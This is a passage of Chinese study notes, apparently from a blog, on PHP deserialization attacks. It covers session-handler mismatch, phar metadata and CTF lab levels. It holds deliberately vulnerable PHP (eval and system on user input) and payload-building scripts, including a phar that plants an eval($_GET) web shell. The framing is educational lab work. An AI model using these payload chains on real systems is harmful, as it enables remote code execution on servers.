invoke__">just4fun</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;enter =&amp; <span class="variable">$a</span>-&gt;secret;<span class="comment">#有点类似指向同一地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240422223947695.png" alt="image-20240422223947695"></p><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>当session start()被调用或者php.ini中session.auto start为1时PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录(默认为&#x2F;tmp)<br><strong>存取数据的格式有多种，常用的有三种：</strong></p><table><thead><tr><th>处理器</th><th>对应得存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数序列化处理得值</td></tr><tr><td>php_serialize(php&gt;&#x3D;5.5.4)</td><td>经过序列化处理得数组</td></tr><tr><td>php_binary</td><td>键名长度对应得ASCII字符+键名+经过反序列化处理得值</td></tr></tbody></table><p><strong>漏洞产生:写入格式和读取格式不一致</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;benben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423132729023.png" alt="image-20240423132729023"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423133002797.png" alt="image-20240423133002797"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423153656983.png" alt="image-20240423153656983"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423153729988.png" alt="image-20240423153729988"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423155140220.png" alt="image-20240423155140220"></p><p><strong>构造</strong>,关键是一个页面写入，另一个页面会读取</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;dir&quot;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">D</span>());</span><br><span class="line"><span class="comment">#O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;dir&quot;)&quot;;&#125;记得+上|</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423155441641.png" alt="image-20240423155441641"></p><p>例题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span><span class="comment">#线索</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要用到引用的知识</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name =&amp; <span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160332991.png" alt="image-20240423160332991"></p><h2 id="phpar"><a href="#phpar" class="headerlink" title="phpar"></a>phpar</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160538802.png" alt="image-20240423160538802"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160548405.png" alt="image-20240423160548405"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160756154.png" alt="image-20240423160756154"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160805460.png" alt="image-20240423160805460"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160937600.png" alt="image-20240423160937600"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423160957547.png" alt="image-20240423160957547"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//漏洞页面</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&quot;echo &#x27;ok&#x27;;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423161535651.png" alt="image-20240423161535651"></p><p>例题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162054135.png" alt="image-20240423162054135"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162144291.png" alt="image-20240423162144291"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162203703.png" alt="image-20240423162203703"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162215775.png" alt="image-20240423162215775"></p><p>记得把php,ini里的phar_readonly关了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162652131.png" alt="image-20240423162652131"><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423162829554.png" alt="image-20240423162829554"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423163005142.png" alt="image-20240423163005142"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423163017481.png" alt="image-20240423163017481"></p><h3 id="mylove"><a href="#mylove" class="headerlink" title="mylove"></a>mylove</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="comment">//当访问 a 对象中不存在的属性时，该方法会调用 b 对象的 love 方法。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="comment">//__destruct 方法在对象销毁时自动调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//__wakeup 方法在对象被反序列化后自动调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将解码后的 $woman 内容写入文件，文件名由 $man 决定。</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="php-SER-libs"><a href="#php-SER-libs" class="headerlink" title="php-SER-libs"></a><strong><a href="https://github.com/fine-1/php-SER-libs">php-SER-libs</a></strong></h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><table><thead><tr><th>关卡</th><th>不适用其他版本的原因以及相关设置</th></tr></thead><tbody><tr><td>level4 create_fucntion与可变函数调用</td><td>5.6不支持可变函数，7.2已废除create_function</td></tr><tr><td>level5 序列化格式过滤与CVE-2016-7124</td><td>CVE-2016-7124漏洞影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</td></tr><tr><td>level6 私有属性反序列化</td><td>escaped binary string(仅从php6开始支持)</td></tr><tr><td>level7 __call与属性的初始值</td><td>同上</td></tr><tr><td>level10 just_one_soap</td><td>需要开启soap扩展(php5.6：extension&#x3D;php_soap)</td></tr><tr><td>level11 a phar 和 level12 a phar trick</td><td>php.ini中phar.readonly&#x3D;Off（若有分号则去掉）</td></tr><tr><td>level13 引用和session</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php;（level13均为默认设置）</td></tr><tr><td>leve14 session.upload_progress</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php_serialize; session.upload_progress.enabled &#x3D; On; session.upload_progress.cleanup &#x3D; Off; session.upload_progress.prefix &#x3D; “upload_progress_”; session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”; session.upload_progress.freq &#x3D; “1%”; session.upload_progress.min_freq &#x3D; “1”;</td></tr></tbody></table><h2 id="level1-类的实例化"><a href="#level1-类的实例化" class="headerlink" title="level1 类的实例化"></a>level1 <strong>类的实例化</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$act</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:1:&quot;a&quot;:1:&#123;s:3:&quot;var&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>直接构造就行</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level3&quot;</span>&gt;点击进入第三关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>关键是要两个成员的值和判断条件一致,而调用construct方法，则需要序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;daydream&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:8:&quot;daydream&quot;;s:4:&quot;pass&quot;;s:2:&quot;ok&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423163756568.png" alt="image-20240423163756568"></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level4&quot;</span>&gt;点击进入第四关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>分析:这里和上一题差不多，就是要从cookie中读取反序列化的值，搜了下，加上url编码即可，但好像只能本地用，</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240423171111860.png" alt="image-20240423171111860"></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>本关涉及到create_fucntion方法要变换php版本，可以使用–php 7. 0.9</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;       